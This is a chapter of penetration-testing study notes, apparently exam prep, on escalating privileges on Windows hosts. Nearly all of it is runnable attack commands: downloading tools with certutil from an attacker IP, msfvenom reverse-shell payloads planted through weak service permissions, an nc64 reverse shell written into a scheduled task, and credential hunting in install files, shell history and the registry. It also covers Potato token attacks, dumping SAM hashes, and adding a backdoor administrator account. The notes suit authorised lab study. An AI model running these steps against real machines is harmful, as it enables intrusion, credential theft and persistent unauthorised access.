# 06 · Windows privilege escalation

Same idea as Linux: enumerate the local context, then match a finding to a vector. The two richest
seams on Windows are **credentials lying around** and **misconfigured services**.

---

## 6.1 Enumerate

```cmd
whoami /all                    :: privileges + group SIDs (SeImpersonate? admin group?)
systeminfo                     :: OS build + hotfixes → kernel-exploit candidates
net users & net localgroup administrators
ipconfig /all & netstat -ano   :: extra NICs (pivot) + internal listeners
```
Automate: `winPEASx64.exe`, or PowerUp's `Invoke-AllChecks`. Stage tools with
`certutil -urlcache -split -f http://<ip>/winPEASx64.exe`.

## 6.2 Hunt credentials

```cmd
:: unattended install files
type C:\Windows\Panther\Unattend.xml           (& \sysprep\ variants)
:: PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
:: saved creds → run as that user without knowing the password
cmdkey /list  &  runas /savecred /user:admin cmd.exe
:: IIS DB connection strings
type C:\inetpub\wwwroot\web.config | findstr connectionString
:: PuTTY stored proxy creds
reg query HKCU\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
> 💡 Any password manager, browser, FTP/SSH/VNC client can cache creds. Also grep the filesystem:
> `findstr /si password *.xml *.ini *.config *.txt`.

## 6.3 Service misconfigurations

The classic Windows privesc family. Payload is always an **exe-service** binary
(`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe-service -o svc.exe`).

**(a) Weak permissions on the service EXE** — you can overwrite the binary:
```cmd
sc qc <svc>                                   :: find BINARY_PATH_NAME + run-as account
icacls "C:\path\service.exe"                  :: look for (M)/(F) for Users/Everyone
move service.exe service.exe.bak & move svc.exe service.exe
sc stop <svc> & sc start <svc>                :: runs your payload as the service account
```

**(b) Unquoted service path** — path has spaces and no quotes, and an earlier folder is writable:
```cmd
sc qc <svc>       :: BINARY_PATH_NAME = C:\Program Files\A B\svc.exe  (unquoted)
:: plant C:\Program.exe or "C:\Program Files\A.exe" if that dir is writable
icacls "C:\MyPrograms"                        :: (WD)/(AD) for Users = you can drop files
```

**(c) Weak service DACL** — you can reconfigure the service itself:
```cmd
accesschk64.exe -qlc <svc>                    :: SERVICE_ALL_ACCESS / SERVICE_CHANGE_CONFIG for Users?
sc config <svc> binPath= "C:\Temp\svc.exe" obj= LocalSystem
sc stop <svc> & sc start <svc>                :: → SYSTEM
```
> 💡 In PowerShell `sc` is an alias for `Set-Content` — use `sc.exe`. Mind the space after `binPath=`.

## 6.4 Scheduled tasks

```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run"
icacls C:\path\task.bat            :: if Users have (F)/(M), overwrite it
echo C:\tools\nc64.exe -e cmd.exe <ip> 443 > C:\path\task.bat
```
Runs as the task's configured user on next trigger.

## 6.5 AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: both = 1  → any MSI runs as SYSTEM
msiexec /quiet /qn /i C:\Temp\shell.msi        :: shell.msi from msfvenom -f msi
```

## 6.6 Token privileges (from `whoami /priv`)

> 💡 Not in most beginner notes but exam-critical — check `whoami /priv` first.
- **SeImpersonatePrivilege** (common on service accounts / IIS / MSSQL) → a **Potato** attack
  (`PrintSpoofer`, `GodPotato`, `JuicyPotato`) gives instant SYSTEM.
  `PrintSpoofer64.exe -i -c cmd` / `GodPotato -cmd "cmd /c whoami"`.
- **SeBackupPrivilege** → read any file: copy `SAM`+`SYSTEM` hives, `secretsdump` them offline.
- **SeRestore / SeTakeOwnership** → overwrite a SYSTEM-run binary or service.

## 6.7 Other checks

- **Registry autoruns** with weak perms: `reg query HKLM\...\CurrentVersion\Run`.
- **Kernel exploit** last (match the `systeminfo` build; can BSOD the box).
- Once SYSTEM: `net user hacker Pass123! /add & net localgroup administrators hacker /add`, then RDP/WinRM in.

## 6.8 Before you move on

- [ ] `whoami /all` + `/priv` read — token-privilege wins checked before anything harder.
- [ ] Credential locations (unattend, PS history, cmdkey, web.config, registry) all hunted.
- [ ] Every service checked for weak EXE perms, unquoted path, and weak DACL.
- [ ] winPEAS/PowerUp run and highlights chased.
- [ ] SYSTEM obtained → grab `proof.txt`, dump hashes (`reg save`/secretsdump) for reuse and AD.
